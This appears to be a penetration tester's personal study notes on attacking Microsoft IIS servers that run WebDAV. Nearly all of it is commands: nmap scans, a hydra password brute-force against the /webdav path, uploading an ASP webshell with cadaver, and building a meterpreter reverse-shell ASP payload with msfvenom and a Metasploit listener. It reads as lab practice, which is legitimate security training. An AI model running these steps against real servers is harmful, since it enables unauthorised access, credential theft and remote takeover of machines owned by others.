# HTTP

- Microsoft IIS
  - Hosts Web pages developed in ASP.NET and PHP.
  - Supported executable file extensions: .asp, .aspx, .config, .php.

- WebDAV typically runs on Apache on MS IIS.
  - Manage files on remote Web server.
  - Requires credentials.

## WebDAV
- "DAVTest tests WebDAV-enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable."

```
nmap -Pn -sV -p80 --script=http-webdav-scan,http-enum <ip>
```

```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> http-get /webdav
```

```
curl http://<ip>/webdav/ -u <username>:<password>
```

```
davtest -url http://<ip>/webdav -auth <username>:<password>
```

```
cadaver http://<ip>/webdav
Username: <username>
Password: <password>

dav:/webdav/> help
dav:/webdav/> ls
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
==> A webshell is a shell that you can access through the Web. It is not a reverse shell.

http://<ip>/webdav/webshell.asp
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > reverse.asp

msf > use /multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST <ip>
msf > set LPORT <port>
msf > exploit

http://<ip>/webdav/reverse.asp
==> Does not work, even with .aspx, why?
```
